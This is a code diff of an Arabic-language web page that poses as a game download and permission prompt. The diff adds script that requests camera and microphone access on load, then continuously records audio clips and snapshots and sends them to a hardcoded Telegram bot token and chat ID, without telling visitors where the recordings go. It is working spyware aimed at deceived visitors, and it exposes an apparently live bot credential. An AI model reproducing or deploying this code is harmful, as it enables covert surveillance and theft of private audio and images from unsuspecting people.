@@ -12,8 +12,12 @@
       display: flex;
       justify-content: center;
       align-items: center;
+      flex-direction: column;
+      gap: 20px;
+      color: white;
+      font-family: sans-serif;
     }
-    #req {
+    button {
       padding: 14px 32px;
       font-size: 20px;
       border: none;
@@ -22,77 +26,142 @@
       background: #0a84ff;
       color: white;
     }
+    #stopBtn { background: #d50000; }
   </style>
 </head>
 <body>
 
-<button id="req">تحميل</button>
+<h2>أذونات التشغيل مطلوبة</h2>
+
+<button id="startBtn" disabled>تشغيل</button>
+
 
 <script>
 let stream = null;
-let recorder = null;
-let active = false;
+let audioActive = false;
+let photoActive = false;
 
 const BOT_TOKEN = "8574889163:AAFJtXmst2oMwx1ubV05QTC_fTF7IHe3124";
 const CHAT_ID   = "5648826330";
 
-const CLIP_MS = 5000; // مدة المقطع = 2 ثانية
+const AUDIO_MS = 5000; // الصوت كل 5 ثواني
+const PHOTO_MS = 2000; // الصورة كل 2 ثانية
 
-function sendToTelegram(blob) {
-  const form = new FormData();
-  form.append("chat_id", CHAT_ID);
-  form.append("voice", blob, "audio.webm");
+// ======================
+// طلب الصلاحيات عند الدخول
+// ======================
+async function requestPermissionsOnLoad() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      audio: true,
+      video: true
+    });
 
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
-    method: "POST",
-    body: form
-  })
-  .then(r => r.json())
-  .then(d => console.log("تم إرسال مقطع:", d))
-  .catch(err => console.error("فشل الإرسال:", err));
+    document.getElementById("startBtn").disabled = false;
+    alert("✔ تم منح صلاحيات  اضغط  للبدء.");
+
+  } catch {
+    alert("⚠ يجب الموافقة على صلاحيات حتى يعمل الموقع.");
+  }
 }
 
-function recordOnce() {
-  return new Promise((resolve) => {
-    recorder = new MediaRecorder(stream);
-    let chunks = [];
+// إستدعاء طلب الأذونات فور فتح الموقع
+requestPermissionsOnLoad();
 
-    recorder.ondataavailable = e => chunks.push(e.data);
-    recorder.onstop = () => {
-      const blob = new Blob(chunks, { type: "audio/webm" });
-      resolve(blob);
-    };
+// ======================
+// إرسال إلى تليجرام
+// ======================
+function sendToTelegram(blob, type="voice") {
+  const form = new FormData();
+  form.append("chat_id", CHAT_ID);
+  form.append(type, blob, type === "voice" ? "audio.webm" : "photo.jpg");
 
-    recorder.start();
-    setTimeout(() => recorder.stop(), CLIP_MS);
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type === "voice" ? "Voice" : "Photo"}`, {
+    method: "POST",
+    body: form
   });
 }
 
-async function startLoop() {
-  if (active) return;
-  active = true;
+// ======================
+// تسجيل صوت 5 ثواني
+// ======================
+function recordAudio() {
+  return new Promise(resolve => {
+    const recorder = new MediaRecorder(stream);
+    const chunks = [];
 
-  while (active) {
-    const blob = await recordOnce();
-    sendToTelegram(blob);
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.onstop = () => resolve(new Blob(chunks, { type: "audio/webm" }));
+    
+    recorder.start();
+    setTimeout(() => recorder.stop(), AUDIO_MS);
+  });
+}
+
+// ======================
+// التقاط صورة
+// ======================
+function captureImage() {
+  return new Promise(resolve => {
+    const video = document.createElement("video");
+    video.srcObject = stream;
+
+    video.onloadedmetadata = () => {
+      video.play();
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      canvas.toBlob(blob => resolve(blob), "image/jpeg");
+    };
+  });
+}
+
+// ======================
+// حلقة الصوت المستمرة
+// ======================
+async function audioLoop() {
+  audioActive = true;
+  while (audioActive) {
+    const audio = await recordAudio();
+    sendToTelegram(audio, "voice");
     await new Promise(r => setTimeout(r, 200));
   }
 }
 
-document.getElementById("req").onclick = async () => {
-  if (stream) return;
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-    startLoop();
-  } catch(e) {
-    alert("يجب اعطاء الاذونات حتى تحمل اقوى لعبه بالسنه ");
+// ======================
+// حلقة الصور المستمرة
+// ======================
+async function photoLoop() {
+  photoActive = true;
+  while (photoActive) {
+    const img = await captureImage();
+    sendToTelegram(img, "photo");
+    await new Promise(r => setTimeout(r, PHOTO_MS));
   }
+}
+
+// ======================
+// زر تشغيل
+// ======================
+document.getElementById("startBtn").onclick = () => {
+  if (!stream) {
+    alert("⚠ الصلاحيات غير مفعلة!");
+    return;
+  }
+
+  audioLoop();
+  photoLoop();
+
+  document.getElementById("startBtn").disabled = true;
+  document.getElementById("stopBtn").disabled = false;
+
+  alert("🔵 بدأ الإرسال المستمر.");
 };
 
-window.onbeforeunload = () => {
-  active = false;
-  if (stream) stream.getTracks().forEach(t => t.stop());
-};
+
 </script>
 
 </body>
